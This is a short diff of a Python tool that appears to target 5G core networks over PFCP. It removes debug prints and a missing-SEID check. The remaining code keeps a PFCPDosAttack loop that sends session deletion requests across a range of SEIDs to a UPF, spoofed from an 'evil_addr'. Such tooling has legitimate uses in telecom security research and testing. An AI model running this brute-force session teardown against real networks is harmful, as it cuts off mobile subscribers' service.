@@ -134,23 +134,21 @@ class Ez_PFCP:
 
 
     def Build_PFCP_session_deletion_req(self, seid=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
-        print(f"#### {seid} ####")
+
         seid = seid or self.seid
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
         
-        if seid is None:
-            print("[EZ-PFCP] No SEID provided for PFCP session deletion request")
-            return
+
         if src_addr is None:
             print("[EZ-PFCP] No source address provided for PFCP session deletion request")
             return
         if self.verbose:
             print(f"[EZ-PFCP] Sending PFCP session deletion packet to {dest_addr} with SEID {seid}")
         
-        print(f"____ {seid} ____")
+
         
         node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
 
@@ -481,7 +479,7 @@ class PFCPDosAttack:
         pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
         for i in range(start_index, start_index+count): 
             try:
-                print(f"------ {i} -------")
+
                 response = pfcp_obj.Send_PFCP_session_deletion_req(seid=i)
 
                     
